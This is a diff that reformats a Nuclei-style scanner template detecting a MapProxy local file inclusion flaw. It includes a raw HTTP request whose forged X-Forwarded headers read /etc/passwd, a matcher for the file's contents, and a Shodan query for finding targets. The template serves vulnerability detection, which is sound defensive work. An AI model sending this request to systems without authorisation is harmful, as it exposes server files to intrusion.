@@ -1,51 +1,57 @@
-id: mapproxy-file-read
+http:
+- matchers:
+  - condition: and
+    part: body
+    regex:
+    - 'root:.*:0:0:'
+    - MapProxy
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    path:
+    - /
+    - /demo
+  raw:
+  - 'GET {{path}}?wms_capabilities&type=external HTTP/1.1
 
+    Host: {{Hostname}}
+
+    X-Forwarded-Proto: file
+
+    X-Forwarded-Host: ///etc/passwd#.xml
+
+    '
+id: mapproxy-file-read
 info:
-  name: MapProxy - Local File Inclusion
   author: xbow,DhiyaneshDk
-  severity: high
-  description: |
-    MapProxy improperly validates and processes X-Forwarded headers, allowing attackers to construct file:// URLs that bypass access controls and read local files through local file inclusion vulnerability.
-  impact: |
-    An attacker can exploit this vulnerability to read sensitive local files like /etc/passwd, configuration files, and other system files, potentially exposing sensitive information.
-  remediation: |
-    Update MapProxy to a patched version that properly validates X-Forwarded headers and restricts file:// URL schemes in proxy configurations.
-  reference:
-    - https://github.com/mapproxy/mapproxy
-    - https://mapproxy.org
   classification:
     cwe-id: CWE-22,CWE-73
+  description: 'MapProxy improperly validates and processes X-Forwarded headers, allowing
+    attackers to construct file:// URLs that bypass access controls and read local
+    files through local file inclusion vulnerability.
+
+    '
+  impact: 'An attacker can exploit this vulnerability to read sensitive local files
+    like /etc/passwd, configuration files, and other system files, potentially exposing
+    sensitive information.
+
+    '
   metadata:
-    verified: true
     max-request: 1
-    vendor: mapproxy
     product: mapproxy
-    shodan-query: 'html:"MapProxy"'
-  tags: mapproxy,oss,lfi,misconfig,vuln
+    shodan-query: html:"MapProxy"
+    vendor: mapproxy
+    verified: true
+  name: MapProxy - Local File Inclusion
+  reference:
+  - https://github.com/mapproxy/mapproxy
+  - https://mapproxy.org
+  remediation: 'Update MapProxy to a patched version that properly validates X-Forwarded
+    headers and restricts file:// URL schemes in proxy configurations.
 
-http:
-  - raw:
-      - |
-        GET {{path}}?wms_capabilities&type=external HTTP/1.1
-        Host: {{Hostname}}
-        X-Forwarded-Proto: file
-        X-Forwarded-Host: ///etc/passwd#.xml
-
-    payloads:
-      path:
-        - /
-        - /demo
-
-    matchers-condition: and
-    matchers:
-      - type: regex
-        part: body
-        regex:
-          - "root:.*:0:0:"
-          - "MapProxy"
-        condition: and
-
-      - type: status
-        status:
-          - 200
-# digest: 4a0a004730450220561a4ef6de3417f12f37923781552a770977411f1f5594ce040e1cfcaee80c0f022100d31e275c3abf9ed6026c8c5eae3b747ca932d9efb86eca2943d9bfb63ca535f6:922c64590222798bb761d5b6d8e72950
+    '
+  severity: high
+  tags: lfi,mapproxy,misconfig,oss,vuln
